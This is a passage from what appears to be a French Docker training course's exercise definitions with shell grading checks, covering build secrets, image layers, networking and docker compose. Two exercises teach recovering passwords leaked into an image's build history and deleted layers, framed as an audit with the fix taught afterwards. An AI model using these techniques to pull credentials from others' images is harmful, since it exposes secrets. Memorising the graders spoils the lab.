             "ticket": {"from": "sophie", "body": "Audit de l'ancienne image de Marc, <code>ancienne-api:0.9</code> (on n'a plus ses sources). Il paraît qu'il a passé le mot de passe de la base à la construction, avec un <code>--build-arg</code>. Si c'est vrai, n'importe qui peut le lire… Prouve-le : retrouve ce mot de passe."},
             "desc": "La valeur de <code>DB_PASSWORD</code> utilisée pour construire <code>ancienne-api:0.9</code> dans <code>~/mdp-build.txt</code>.",
             "hints": ["Pas de sources ? L'image garde la trace de sa construction : ses instructions… et leurs paramètres.",
                       "<code>docker history</code>, sans tronquer les commandes."],
             "checks": [
                 ('a=$(ans $H/mdp-build.txt); [ "${a#DB_PASSWORD=}" = "$LAB_DBPW" ]', "Ce n'est pas le mot de passe passé à la construction de ancienne-api:0.9."),
             ]},
            {"id": "D8.3", "points": 4, "title": "Supprimé… vraiment ?",
             "ticket": {"from": "sophie", "body": "Deuxième trouvaille : dans <code>ancienne-api:0.9</code>, Marc a copié un fichier <code>/config/identifiants.txt</code>, puis l'a supprimé « par sécurité ». Un conteneur ne le voit plus, c'est vrai. Mais je parie qu'il est toujours dans l'image. Retrouve le mot de passe qu'il contient."},
             "desc": "Le mot de passe du fichier <code>/config/identifiants.txt</code> (la valeur après <code>motdepasse=</code>) dans <code>~/mdp-couche.txt</code>.",
             "hints": ["Une image s'exporte en archive avec toutes ses couches. Dans quelle couche le fichier a-t-il été ajouté ?",
                       "<code>docker save</code> puis <code>tar -xf</code> dans un dossier vide : chaque fichier de <code>blobs/sha256/</code> est une couche (une archive tar) ou un fichier JSON. <code>tar -tf</code> liste une couche, <code>tar -xOf couche chemin</code> affiche un fichier."],
             "checks": [
                 ('a=$(ans $H/mdp-couche.txt); [ "${a#motdepasse=}" = "$LAB_COUCHE" ]', "Ce n'est pas le mot de passe de /config/identifiants.txt."),
             ]},
            {"id": "D8.4", "points": 5, "title": "Une licence qui ne fuit pas", "manual": True,
             "ticket": {"from": "nadia", "body": "L'outil de réassort (<code>~/projet/prive</code>) doit être activé <strong>à la construction</strong> avec la licence du fournisseur, rangée dans <code>~/licences/reassort.txt</code>. Le Dockerfile de Marc la copie dans l'image (tu as vu ce que ça donne) et ne se construit même plus. Ne la copie surtout pas dans le projet : passe-la en <strong>secret de construction</strong>, et construis <code>outil-reassort:1.0</code>."},
             "desc": "<code>outil-reassort:1.0</code> est activée avec la licence de <code>~/licences/reassort.txt</code>, reçue par <code>RUN --mount=type=secret</code> ; la licence n'apparaît ni dans les couches ni dans l'historique de l'image.",
             "hints": ["La licence ne doit exister que pendant l'instruction qui l'utilise : BuildKit sait monter un fichier le temps d'un seul RUN. Que fait <code>activer.sh</code> de son argument ?",
                       "<code>RUN --mount=type=secret,id=…</code> (fichier monté dans <code>/run/secrets/&lt;id&gt;</code>) et <code>docker build --secret id=…,src=$HOME/…</code>."],
             "checks": [
                 ('grep -q "type=secret" $P/prive/Dockerfile', "Le Dockerfile doit recevoir la licence par un secret de construction (RUN --mount=type=secret…)."),
                 ('docker image inspect outil-reassort:1.0', "L'image outil-reassort:1.0 n'existe pas."),
                 ('[ "$(docker run --rm outil-reassort:1.0 cat /opt/reassort/activation)" = "$LAB_ACTIV" ]', "outil-reassort:1.0 n'est pas activée avec la licence de ~/licences/reassort.txt."),
                 ('! docker history --no-trunc outil-reassort:1.0 | grep -qF "$LAB_LICENCE"', "La licence apparaît dans l'historique de l'image (ARG ?)."),
                 ('! docker save outil-reassort:1.0 | grep -aqF "$LAB_LICENCE"', "La licence est encore présente dans une couche de l'image."),
             ]},
            {"id": "D8.5", "points": 5, "title": "Le secret recopié", "manual": True,
             "ticket": {"from": "sophie", "body": "L'outil de stock de Marc (<code>~/projet/outil-stock</code>) utilise pourtant un secret de construction pour le jeton du fournisseur (<code>~/licences/stock.txt</code>)… et l'audit retrouve quand même le jeton dans l'image <code>outil-stock:1.0</code> ! Trouve la fuite, corrige le Dockerfile et reconstruis <code>outil-stock:1.0</code>."},
             "desc": "<code>outil-stock:1.0</code>, construite depuis <code>~/projet/outil-stock</code> avec le secret, est installée avec le jeton de <code>~/licences/stock.txt</code> ; le jeton n'apparaît ni dans ses couches ni dans son historique.",
             "hints": ["Le secret monté n'est écrit dans aucune couche… sauf si une commande le recopie ailleurs. Relisez le RUN, et cherchez le jeton dans l'image (<code>docker save outil-stock:1.0 | grep -a JETON</code>).",
                       "<code>installer.sh</code> accepte le chemin du jeton en argument : faites-lui lire directement <code>/run/secrets/jeton</code>. (Supprimer la copie dans le <strong>même</strong> RUN fonctionne aussi ; dans un RUN suivant, jamais.)"],
             "checks": [
                 ('grep -q "type=secret" $P/outil-stock/Dockerfile', "Le Dockerfile de ~/projet/outil-stock doit toujours recevoir le jeton par un secret de construction."),
                 ('[ "$(docker run --rm outil-stock:1.0 cat /opt/stock/installe)" = "$LAB_ACTIV_STOCK" ]', "outil-stock:1.0 n'est pas installée avec le jeton de ~/licences/stock.txt (docker build --secret …)."),
                 ('! docker history --no-trunc outil-stock:1.0 | grep -qF "$LAB_JETON"', "Le jeton apparaît dans l'historique de l'image outil-stock:1.0."),
                 ('! docker save outil-stock:1.0 | grep -aqF "$LAB_JETON"', "Le jeton est encore présent dans une couche de l'image outil-stock:1.0 : quelle commande l'y a recopié ?"),
             ]},
            {"id": "D8.6", "points": 5, "title": "50 Mo pour trois lignes", "manual": True,
             "ticket": {"from": "nadia", "body": "L'image <code>rapport-compact:1.0</code> de Marc (<code>~/projet/rapport-compact</code>) affiche trois lignes… et pèse plus de 50 Mo ! Pourtant il supprime bien son fichier de travail. Ramène-la sous <strong>15 Mo</strong>, avec exactement le même résultat."},
             "desc": "Construite depuis <code>~/projet/rapport-compact</code>, <code>rapport-compact:1.0</code> pèse moins de 15 Mo et affiche le même résultat qu'avant.",
             "hints": ["<code>docker history rapport-compact:1.0</code> : quelle couche pèse ? Que fait réellement le <code>rm</code> de la dernière instruction ?",
                       "Un fichier créé puis supprimé <strong>dans le même RUN</strong> n'est écrit dans aucune couche. Autre solution : une étape de construction séparée, et <code>COPY --from</code> du seul résultat."],
             "checks": [
                 ('docker image inspect rapport-compact:1.0 >/dev/null', "L'image rapport-compact:1.0 n'existe pas."),
                 ('[ "$(docker run --rm rapport-compact:1.0 | sha256sum | cut -c1-16)" = "$LAB_COMPACT" ]', "rapport-compact:1.0 n'affiche plus exactement le même résultat que la version de Marc."),
                 ('s=$(insp rapport-compact:1.0 "{{.Size}}"); echo "MSG:taille de rapport-compact:1.0 : $((s / 1000000)) Mo"; [ "$s" -lt 15000000 ]', "L'image rapport-compact:1.0 pèse encore plus de 15 Mo."),
                 ('docker build -q -t lab-verif-compact $P/rapport-compact >/dev/null && s=$(insp lab-verif-compact "{{.Size}}") && o=$(docker run --rm lab-verif-compact | sha256sum | cut -c1-16); docker rmi lab-verif-compact >/dev/null 2>&1; [ "$s" -lt 15000000 ] && [ "$o" = "$LAB_COMPACT" ]', "Construite depuis ~/projet/rapport-compact/Dockerfile, l'image pèse plus de 15 Mo ou ne donne pas le même résultat."),
             ]},
            {"id": "D8.7", "points": 3, "title": "Livrer sans registre", "manual": True,
             "ticket": {"from": "lea", "body": "Le magasin de Chamonix n'a pas accès à notre registre. Livre-leur le catalogue <code>catalogue-web:1.0</code> « sur clé USB » : <code>~/livraison/catalogue-web.tar.gz</code>. Là-bas, ils doivent pouvoir le recharger tel quel, avec son nom, son tag et sa configuration (port, commande de démarrage)."},
             "desc": "<code>~/livraison/catalogue-web.tar.gz</code> est une archive gzip de l'image complète <code>catalogue-web:1.0</code> (tag compris), rechargeable avec <code>docker load</code>.",
             "hints": ["Deux commandes produisent une archive tar : l'une exporte les fichiers d'un <strong>conteneur</strong>, l'autre une <strong>image</strong> complète. Laquelle garde le tag et la configuration ?",
                       "<code>docker save</code>, compressé avec <code>gzip</code> ; le magasin fera <code>docker load</code>."],
             "checks": [
                 ('gzip -t $H/livraison/catalogue-web.tar.gz', "~/livraison/catalogue-web.tar.gz est absent ou n'est pas une archive gzip."),
                 ('tar -xzOf $H/livraison/catalogue-web.tar.gz manifest.json 2>/dev/null | jq -e \'.[0].RepoTags | index("catalogue-web:1.0")\' >/dev/null', "L'archive n'est pas une image complète portant le tag catalogue-web:1.0 (docker export ne garde que les fichiers d'un conteneur)."),
                 ('c=$(tar -xzOf $H/livraison/catalogue-web.tar.gz manifest.json | jq -r ".[0].Config"); [ "sha256:$(basename "$c")" = "$(id_img catalogue-web:1.0)" ]', "L'image contenue dans l'archive n'est pas la version actuelle de catalogue-web:1.0."),
             ]},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    9: {
        "title": "Jour 9 — Faire dialoguer les conteneurs",
        "description": "Réseaux utilisateur, résolution par nom et cloisonnement. Compétences : docker network (create, connect, --internal), alias, variables d'environnement, diagnostic DNS.",
        "lesson": """<h3>Réseaux</h3><pre>docker network create reseau-demo<br>docker run -d --name base-demo --network reseau-demo redis:7-alpine<br>docker run -d --name app-demo --network reseau-demo -e DB_HOST=base-demo mon-app:1.0</pre><ul><li>Sur un réseau <strong>créé par vous</strong>, les conteneurs se joignent <strong>par leur nom</strong> (DNS intégré de Docker, à l'adresse 127.0.0.11) : l'application contacte <code>base-demo:6379</code>.</li><li>Un conteneur lancé sans <code>--network</code> arrive sur le réseau <code>bridge</code> par défaut : il a une adresse IP, mais <strong>aucun nom</strong> n'y est résolu. Et les adresses changent à chaque redémarrage : on ne configure jamais une application avec une adresse IP de conteneur.</li><li>Un service qui n'est utilisé que par d'autres conteneurs n'a <strong>pas</strong> besoin de <code>-p</code> : ne publiez que ce qui doit être joignable de l'extérieur.</li></ul><h3>Plusieurs réseaux, à chaud</h3><p>Un conteneur peut être branché sur <strong>plusieurs</strong> réseaux, et en changer sans être recréé ni redémarré :</p><pre>docker network ls<br>docker network inspect reseau-demo<br>docker network connect reseau-demo conteneur<br>docker network disconnect reseau-demo conteneur<br>docker inspect -f '{{json .NetworkSettings.Networks}}' conteneur</pre><h3>Des noms en plus : les alias</h3><p>Sur un réseau, un conteneur peut répondre à des noms supplémentaires : <code>--network-alias nom</code> au lancement, <code>docker network connect --alias nom …</code> à chaud. Plusieurs conteneurs peuvent porter le même alias : le DNS renvoie alors toutes leurs adresses.</p><h3>Cloisonner</h3><p><code>docker network create --internal reseau</code> crée un réseau <strong>sans passerelle</strong> vers l'extérieur : ses conteneurs ne se parlent qu'entre eux. Un conteneur qui doit à la fois parler à une base cloisonnée et être publié se branche sur les deux réseaux.</p><h3>Diagnostiquer</h3><pre>docker exec app-demo nslookup base-demo     # le nom existe-t-il, vu de ce conteneur ?<br>docker exec app-demo ping -c1 base-demo<br>docker exec app-demo env                    # la configuration vue par l'application</pre><h3>Variables d'environnement</h3><p><code>-e NOM=valeur</code> configure l'application sans reconstruire l'image. Pour changer la configuration d'un conteneur existant, on le <strong>recrée</strong> (<code>docker rm -f</code> puis <code>docker run</code>).</p>""",
        "setup": r'''
images_de_base
arreter_jour 7
arreter rapports-nuit etiqueteuse
# Image de l'API : celle du jour 6 si elle existe, sinon une image de secours construite depuis les sources
image_api boutique-api:1.0
image_api api-diag:1.0
L="--label lab.jour=9"
# Deux conteneurs de l'ancienne application, sur le réseau par défaut
docker rm -f legacy-web legacy-db >/dev/null 2>&1 || true
docker network rm reseau-legacy >/dev/null 2>&1 || true
docker run -d --name legacy-db $L alpine sleep infinity >/dev/null
docker run -d --name legacy-web $L alpine sleep infinity >/dev/null
emit WEBID "$(docker inspect -f '{{.Id}}' legacy-web)"
emit DBID "$(docker inspect -f '{{.Id}}' legacy-db)"
emit WEBSTART "$(docker inspect -f '{{.State.StartedAt}}' legacy-web)"
emit DBSTART "$(docker inspect -f '{{.State.StartedAt}}' legacy-db)"
# D9.4 : une API et son Redis, sur deux réseaux différents, avec un nom d'hôte qui n'existe pas
nettoyer D9.4
docker rm -f api-diag >/dev/null 2>&1 || true
for n in $(docker network ls -q --filter label=lab.exercice=D9.4); do docker network rm $n >/dev/null 2>&1 || true; done
ra="app-$(rword)"; rs="stock-$(rword)"; cache="cache-$(rword)"
docker network create --label lab.exercice=D9.4 $ra >/dev/null
docker network create --label lab.exercice=D9.4 $rs >/dev/null
docker run -d --name $cache $L --label lab.exercice=D9.4 --network $rs redis:7-alpine redis-server --appendonly yes >/dev/null
attendre_redis $cache
seed=$((RANDOM % 8000 + 1000))
docker exec $cache redis-cli set visites $seed >/dev/null
docker run -d --name api-diag $L --label lab.exercice=D9.4 --network $ra -p 3003:3000 -e REDIS_HOST=redis-cache api-diag:1.0 >/dev/null
emit CACHE "$cache"
emit CACHE_ID "$(docker inspect -f '{{.Id}}' $cache)"
emit SEED "$seed"
''',
        "exercises": [
            {"id": "D9.1", "points": 6, "title": "Compter les visites",
             "ticket": {"from": "thomas", "body": "L'API (<code>boutique-api:1.0</code>, jour 6) sait compter les visites (<code>/visites</code>) dans Redis, si on lui donne l'hôte Redis dans <code>REDIS_HOST</code>. Crée un réseau <code>reseau-boutique</code>, un conteneur <code>redis</code> dessus (surtout pas exposé à l'extérieur), et recrée l'<code>api</code> sur ce réseau, toujours sur le port 3000."},
             "desc": "<code>redis</code> et <code>api</code> sur le réseau <code>reseau-boutique</code> ; <code>redis</code> ne publie aucun port ; l'API désigne Redis par son nom ; <code>http://localhost:3000/visites</code> compte les visites.",
             "hints": ["Sur quel réseau les conteneurs arrivent-ils par défaut, et peuvent-ils s'y appeler par leur nom ? Un conteneur existant ne change pas de variables d'environnement : il faut le recréer.",
                       "Un réseau créé par vous, <code>--network</code> sur les deux conteneurs, et <code>-e REDIS_HOST=</code> le <strong>nom</strong> du conteneur Redis (jamais une adresse IP)."],
             "checks": [
                 ('docker network inspect reseau-boutique', "Le réseau reseau-boutique n'existe pas."),
                 ('running redis && running api', "Les conteneurs redis et api doivent tourner."),
                 ("n=$(docker network inspect -f '{{range .Containers}}{{.Name}}{{println}}{{end}}' reseau-boutique); echo \"$n\" | grep -qx redis && echo \"$n\" | grep -qx api", "redis et api doivent tous deux être connectés à reseau-boutique."),
                 ('[ -z "$(docker port redis)" ]', "redis ne doit publier aucun port sur la machine."),
                 ("h=$(insp api '{{range .Config.Env}}{{println .}}{{end}}' | sed -n 's/^REDIS_HOST=//p'); [ -n \"$h\" ] && ! echo \"$h\" | grep -Eq '^[0-9.]+$'", "REDIS_HOST doit désigner Redis par son nom : une adresse IP de conteneur change à chaque redémarrage."),
                 ('a=$(http 3000 /visites | jq -e .visites) && b=$(http 3000 /visites | jq -e .visites) && [ "$b" -gt "$a" ]', "http://localhost:3000/visites ne compte pas les visites (REDIS_HOST ?)."),
             ]},
            {"id": "D9.2", "points": 4, "title": "Brancher sans redémarrer",
             "ticket": {"from": "lea", "body": "L'ancienne application tourne dans deux conteneurs, <code>legacy-web</code> et <code>legacy-db</code>, lancés sans réseau particulier. <code>legacy-web</code> n'arrive pas à joindre <code>legacy-db</code> par son nom (<code>docker exec legacy-web ping -c1 legacy-db</code>). Règle ça <strong>sans arrêter, redémarrer ni recréer</strong> les conteneurs : ils sont en production. Et pas de bricolage dans <code>/etc/hosts</code> : le nom doit être résolu par Docker."},
             "desc": "<code>legacy-web</code> joint <code>legacy-db</code> par son nom, grâce à un réseau commun créé par vous ; les deux conteneurs d'origine n'ont été ni recréés, ni arrêtés, ni redémarrés.",
             "hints": ["Sur le réseau <code>bridge</code> par défaut, aucun nom n'est résolu. Un conteneur peut rejoindre un autre réseau sans être arrêté.",
                       "<code>docker network create</code>, puis <code>docker network connect</code> pour chacun des deux conteneurs."],
             "checks": [
                 ('[ "$(insp legacy-web "{{.Id}}")" = "$LAB_WEBID" ] && [ "$(insp legacy-db "{{.Id}}")" = "$LAB_DBID" ]', "legacy-web ou legacy-db a été recréé : il fallait les brancher sans les recréer (bouton « Réinitialiser les fichiers de cette étape » pour recommencer)."),
                 ('running legacy-web && running legacy-db && [ "$(insp legacy-web "{{.State.StartedAt}}")" = "$LAB_WEBSTART" ] && [ "$(insp legacy-db "{{.State.StartedAt}}")" = "$LAB_DBSTART" ]', "legacy-web ou legacy-db a été arrêté ou redémarré : ils sont en production (bouton « Réinitialiser les fichiers de cette étape » pour recommencer)."),
                 ('! docker exec legacy-web grep -q legacy-db /etc/hosts', "legacy-db a été ajouté à la main dans /etc/hosts de legacy-web : c'est le DNS de Docker qui doit résoudre ce nom."),
                 ("w=\" $(insp legacy-web '{{range $k, $v := .NetworkSettings.Networks}}{{$k}} {{end}}') \"; for n in $(insp legacy-db '{{range $k, $v := .NetworkSettings.Networks}}{{$k}} {{end}}'); do [ \"$n\" != bridge ] && case \"$w\" in *\" $n \"*) exit 0 ;; esac; done; exit 1", "legacy-web et legacy-db n'ont aucun réseau créé par vous en commun."),
                 ('docker exec legacy-web ping -c1 -W2 legacy-db', "legacy-web ne joint toujours pas legacy-db par son nom."),
             ]},
            {"id": "D9.3", "points": 5, "title": "La base ne sort pas",
             "ticket": {"from": "sophie", "body": "Nouvelle règle de sécurité pour la boutique sécurisée : déploie une API <code>api-sec</code> (<code>boutique-api:1.0</code>, publiée sur le port <strong>3002</strong>) et son Redis <code>redis-sec</code>. Redis ne doit être joignable que par l'API, et ne doit rien pouvoir joindre hors de son réseau : aucune sortie vers l'extérieur."},
             "desc": "<code>redis-sec</code> est branché sur un seul réseau, interne (sans accès vers l'extérieur), qu'il partage avec <code>api-sec</code> ; <code>http://localhost:3002/visites</code> compte les visites.",
             "hints": ["Un réseau peut être créé sans aucune passerelle vers l'extérieur. Et un conteneur peut être branché sur deux réseaux : lequel de vos conteneurs en a besoin ?",
                       "<code>docker network create --internal …</code> pour Redis ; l'API sur un réseau ordinaire (celui qui permet de publier son port) <strong>et</strong> sur le réseau interne (<code>docker network connect</code>)."],
             "checks": [
                 ('running redis-sec && running api-sec', "Les conteneurs redis-sec et api-sec doivent tourner."),
                 ("n=$(insp redis-sec '{{range $k, $v := .NetworkSettings.Networks}}{{$k}} {{end}}'); [ \"$(echo $n | wc -w)\" = 1 ] && [ \"$(docker network inspect -f '{{.Internal}}' $n)\" = true ]", "redis-sec doit être branché sur un seul réseau, créé sans accès vers l'extérieur (--internal)."),
                 ("r=$(insp redis-sec '{{range $k, $v := .NetworkSettings.Networks}}{{$k}}{{end}}'); insp api-sec '{{range $k, $v := .NetworkSettings.Networks}}{{$k}} {{end}}' | grep -qw \"$r\"", "api-sec doit être branché sur le réseau interne de redis-sec."),
                 ('[ -z "$(docker port redis-sec)" ]', "redis-sec ne doit publier aucun port."),
                 ('a=$(http 3002 /visites | jq -e .visites) && b=$(http 3002 /visites | jq -e .visites) && [ "$b" -gt "$a" ]', "http://localhost:3002/visites ne compte pas les visites (api-sec est-il publié, et joint-il redis-sec par son nom ?)."),
             ]},
            {"id": "D9.4", "points": 5, "title": "Pourquoi l'API ne voit pas Redis ?",
             "ticket": {"from": "lea", "body": "L'API <code>api-diag</code> (port 3003) répond « injoignable » sur <code>/visites</code>. Son Redis, c'est le conteneur <code>cache-…</code> : il contient les compteurs de visites de l'année, donc <strong>interdiction de le recréer ou de l'arrêter</strong>. Trouve ce qui cloche et répare, pour que l'API compte dans ce Redis-là."},
             "desc": "<code>http://localhost:3003/visites</code> compte les visites dans le Redis <code>cache-…</code> d'origine (compteur de l'année compris), qui n'a été ni recréé ni arrêté.",
             "hints": ["Deux questions : l'API et Redis ont-ils un réseau en commun ? Le nom demandé par l'API (<code>docker exec api-diag env</code>) existe-t-il ? <code>docker exec api-diag nslookup …</code>",
                       "Un conteneur peut rejoindre un réseau à chaud, et y recevoir un nom supplémentaire : <code>docker network connect --alias …</code>. (Recréer l'API avec une autre configuration marche aussi.)"],
             "checks": [
                 ('running "$LAB_CACHE" && [ "$(insp "$LAB_CACHE" "{{.Id}}")" = "$LAB_CACHE_ID" ]', "Le Redis des compteurs a été recréé ou arrêté : il fallait le garder (bouton « Réinitialiser les fichiers de cette étape » pour recommencer)."),
                 ('running api-diag', "Le conteneur api-diag ne tourne pas."),
                 ('v=$(http 3003 /visites | jq -e .visites) && [ "$v" -gt "$LAB_SEED" ]', "http://localhost:3003/visites ne compte pas les visites dans le Redis des compteurs."),
             ]},
            {"id": "D9.5", "points": 4, "title": "Deux vitrines derrière un nom",
             "ticket": {"from": "nadia", "body": "Pour tenir la charge des soldes, je veux deux instances de la vitrine, <code>vitrine-a</code> et <code>vitrine-b</code> (nginx:alpine, sans port publié), sur <code>reseau-boutique</code>. Les autres conteneurs du réseau doivent les joindre toutes les deux par un seul nom : <code>vitrine-interne</code>."},
             "desc": "Sur <code>reseau-boutique</code>, le nom <code>vitrine-interne</code> désigne les adresses de <code>vitrine-a</code> et de <code>vitrine-b</code>.",
             "hints": ["Un conteneur peut avoir des noms supplémentaires sur un réseau, et plusieurs conteneurs peuvent partager le même.",
                       "<code>--network-alias</code> au lancement (ou <code>docker network connect --alias</code>). Vérifiez depuis un conteneur jetable : <code>docker run --rm --network reseau-boutique alpine nslookup vitrine-interne</code>."],
             "checks": [
                 ('running vitrine-a && running vitrine-b', "vitrine-a et vitrine-b doivent tourner."),
                 ("for c in vitrine-a vitrine-b; do insp $c '{{range $k, $v := .NetworkSettings.Networks}}{{$k}} {{end}}' | grep -qw reseau-boutique || exit 1; done", "vitrine-a et vitrine-b doivent être branchées sur reseau-boutique."),
                 ("a=$(for c in vitrine-a vitrine-b; do insp $c '{{with index .NetworkSettings.Networks \"reseau-boutique\"}}{{.IPAddress}}{{end}}'; echo; done | sort | xargs); o=$(docker run --rm --network reseau-boutique alpine nslookup -type=a vitrine-interne 2>/dev/null | awk '/^Address/ && !/:53/ {print $2}' | sort | xargs); echo \"MSG:vitrine-interne → ${o:-aucune adresse}\"; [ -n \"$o\" ] && [ \"$o\" = \"$a\" ]", "Sur reseau-boutique, le nom vitrine-interne doit désigner vitrine-a ET vitrine-b."),
             ]},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    10: {
        "title": "Jour 10 — Toute la pile avec docker compose",
        "description": "Décrire et lancer une application multi-conteneurs. Compétences : compose.yaml, build, ports, volumes, depends_on, healthcheck, .env, profils.",
        "lesson": """<h3>Un fichier au lieu de dix commandes</h3><pre>services:<br>  front:<br>    image: nginx:alpine<br>    ports:<br>      - "9080:80"<br>    volumes:<br>      - ./conf/front.conf:/etc/nginx/conf.d/default.conf:ro<br>    depends_on:<br>      - back<br>  back:<br>    build: ./back                # construit l'image depuis ./back/Dockerfile<br>    environment:<br>      DB_HOST: base<br>  base:<br>    image: redis:7-alpine<br>    volumes:<br>      - base-donnees:/data<br>volumes:<br>  base-donnees:</pre><pre>docker compose up -d --build     # construit et démarre tout (recrée ce qui a changé)<br>docker compose ps                # état des services<br>docker compose logs -f back<br>docker compose exec back sh      # shell dans un service<br>docker compose run --rm back sh  # un conteneur ponctuel du service<br>docker compose down              # arrête et supprime les conteneurs et le réseau du projet</pre><ul><li>Compose crée un réseau pour le projet : les services se joignent par leur <strong>nom de service</strong>.</li><li>Le nom du projet vient du dossier (<code>projet</code>) : conteneurs <code>projet-back-1</code>, volume <code>projet_base-donnees</code>…</li><li>Les volumes <strong>nommés</strong> (déclarés dans la section <code>volumes:</code> de premier niveau) survivent à <code>down</code>, sauf avec <code>down -v</code>.</li><li>nginx résout les noms de ses serveurs amont (<code>proxy_pass</code>) à son démarrage : si le service visé n'existe pas encore, nginx s'arrête (« host not found in upstream »). <code>depends_on</code> fixe l'ordre de démarrage.</li></ul><h3>Attendre qu'un service soit prêt</h3><p><code>depends_on</code> attend que le conteneur soit <em>démarré</em>, pas que le service soit <em>prêt</em>. Avec un healthcheck :</p><pre>  back:<br>    healthcheck:<br>      test: ["CMD", "wget", "-q", "--spider", "http://localhost:8000/"]<br>      interval: 5s<br>  front:<br>    depends_on:<br>      back:<br>        condition: service_healthy</pre><h3>Variables</h3><ul><li>Compose lit le fichier <code>.env</code> du dossier du projet : <code>${NOM}</code> dans <code>compose.yaml</code> est remplacé par sa valeur, à la lecture du fichier.</li><li><code>environment:</code> donne des variables au conteneur ; <code>env_file: fichier</code> les lit dans un fichier.</li><li><code>docker compose config</code> affiche la configuration réellement appliquée, variables remplacées.</li></ul><h3>Les profils</h3><p>Un service avec <code>profiles: [debug]</code> n'existe que si le profil est activé : <code>docker compose --profile debug up -d</code>, ou <code>docker compose --profile debug run --rm …</code>. Un simple <code>docker compose up</code> l'ignore.</p><div class="tip">Les ports de l'hôte sont partagés : arrêtez d'abord les conteneurs lancés à la main qui publient les mêmes ports.</div>""",
        "setup": r'''
images_de_base
livrer api site nginx
arreter_jour 8
arreter catalogue
# D10.6 : la pile du stock de Diallo
mkdir -p $H/stock
if [ ! -f $H/stock/compose.yaml ]; then
cat > $H/stock/compose.yaml <<'EOF'
# Pile du stock (Diallo) : Redis garde les quantités en stock.
services:
  redis:
    image: redis:7-alpine
    command: redis-server --appendonly yes
    volumes:
      - /data
EOF
fi
own $H/stock
(cd $H/stock && docker compose up -d >/dev/null 2>&1) || true
''',
        "exercises": [
            {"id": "D10.1", "points": 6, "title": "La pile en un fichier",
             "ticket": {"from": "lea", "body": "Tes commandes <code>docker run</code> à rallonge, personne ne pourra les rejouer. Décris la pile dans <code>~/projet/compose.yaml</code> : un service <code>api</code> construit depuis <code>./api</code>, un service <code>redis</code> dont les données sont dans un volume nommé, l'API configurée pour joindre Redis. Puis supprime les conteneurs lancés à la main et démarre la pile."},
             "desc": "<code>~/projet/compose.yaml</code> valide, avec les services <code>api</code> (<code>build: ./api</code>) et <code>redis</code> (volume nommé sur <code>/data</code>), démarrés ; l'API compte les visites.",
             "hints": ["Transposez vos <code>docker run</code> du jour 9 : chaque option a son équivalent dans un service. Quel nom d'hôte l'API doit-elle utiliser pour joindre Redis dans la pile ?",
                       "Le nom d'hôte est le nom du service. <code>docker compose up -d --build</code> depuis <code>~/projet</code>, puis <code>docker compose exec api wget -qO- localhost:3000/visites</code>."],
             "checks": [
                 ('compose $P/compose.yaml config -q', "~/projet/compose.yaml est absent ou invalide (docker compose config pour voir l'erreur)."),
                 ('cfg $P/compose.yaml \'.services.api.build.context | endswith("/api")\'', "Le service api doit être construit depuis ./api (build)."),
                 ('cfg $P/compose.yaml \'.services.redis.volumes[]? | select(.type == "volume" and .target == "/data")\'', "Le service redis doit stocker /data dans un volume nommé."),
                 ('s=$(compose $P/compose.yaml ps --status running --services); echo "$s" | grep -qx api && echo "$s" | grep -qx redis', "Les services api et redis ne tournent pas (docker compose up -d)."),
                 ('compose $P/compose.yaml exec -T api wget -qO- http://localhost:3000/visites | jq -e ".visites >= 1"', "Dans la pile, l'API ne parvient pas à compter les visites (REDIS_HOST ?)."),
             ]},
            {"id": "D10.2", "points": 5, "title": "Un seul point d'entrée",
             "ticket": {"from": "sophie", "body": "Pour la sécurité, une seule porte d'entrée : ajoute un service <code>web</code> (nginx:alpine) publié sur le port <strong>8080</strong>, qui sert le site (<code>./site</code>) et relaie <code>/api/</code> vers l'API grâce à <code>./nginx/default.conf</code>. L'API ne doit plus être publiée directement."},
             "desc": "Le service <code>web</code> publie 8080, sert le site et relaie <code>/api/</code> ; le service <code>api</code> ne publie aucun port.",
             "hints": ["Le service <code>web</code> a besoin de deux montages : sa configuration et le site. Lisez <code>./nginx/default.conf</code> : vers quel nom relaie-t-il ? Ce nom doit exister quand nginx démarre.",
                       "Montages en lecture seule sur <code>/etc/nginx/conf.d/default.conf</code> et <code>/usr/share/nginx/html</code>, <code>depends_on: [api]</code>. Le port 8080 est peut-être encore pris par le conteneur <code>vitrine</code> du jour 3."],
             "checks": [
                 ('compose $P/compose.yaml ps --status running --services | grep -qx web', "Le service web de la pile ne tourne pas (docker compose ps -a, puis docker compose logs web)."),
                 ('http 8080 / | grep -q "Cimes"', "http://localhost:8080 ne sert pas le site de la boutique."),
                 ('http 8080 /api/health | jq -e ".statut == \\"ok\\""', "http://localhost:8080/api/health ne répond pas : le proxy vers l'API ne fonctionne pas."),
                 ('cfg $P/compose.yaml \'(.services.api.ports // []) | length == 0\'', "Le service api ne doit plus publier de port : tout passe par web."),
             ]},
            {"id": "D10.3", "points": 4, "title": "Démarrer dans le bon ordre",
             "ticket": {"from": "nadia", "body": "Au démarrage, l'API renvoie parfois des erreurs parce que Redis n'est pas encore prêt. Ajoute un <strong>healthcheck</strong> à Redis, et fais attendre l'API jusqu'à ce que Redis soit <em>en bonne santé</em>."},
             "desc": "<code>redis</code> a un healthcheck fondé sur <code>redis-cli ping</code> et est <em>healthy</em> ; <code>api</code> en dépend avec <code>condition: service_healthy</code>.",
             "hints": ["Quelle commande, disponible dans l'image Redis, répond seulement quand le serveur est prêt ? Et comment une dépendance peut-elle attendre un état de santé ?",
                       "<code>test: [\"CMD\", \"redis-cli\", \"ping\"]</code> sur redis ; sur api, la forme longue de <code>depends_on</code> avec <code>condition: service_healthy</code>."],
             "checks": [
                 ('cfg $P/compose.yaml \'.services.redis.healthcheck.test | tostring | test("redis-cli") and test("ping")\'', "Le service redis n'a pas de healthcheck fondé sur redis-cli ping."),
                 ('cfg $P/compose.yaml \'.services.api.depends_on.redis.condition == "service_healthy"\'', "Le service api doit dépendre de redis avec condition: service_healthy."),
                 ('[ "$(insp "$(compose $P/compose.yaml ps -q redis)" "{{.State.Health.Status}}")" = healthy ]', "Le conteneur redis n'est pas (encore) healthy : relancez docker compose up -d."),
             ]},
            {"id": "D10.4", "points": 4, "title": "Une version configurable",
             "ticket": {"from": "thomas", "body": "L'API affiche sa version dans <code>/health</code> (variable <code>APP_VERSION</code>). Je ne veux plus modifier <code>compose.yaml</code> à chaque livraison : la version doit venir d'un fichier <code>.env</code>, à côté. On livre la <strong>2.0</strong>."},
             "desc": "<code>~/projet/.env</code> définit <code>APP_VERSION=2.0</code>, <code>compose.yaml</code> ne contient pas la version en dur, et <code>/api/health</code> affiche la version 2.0.",
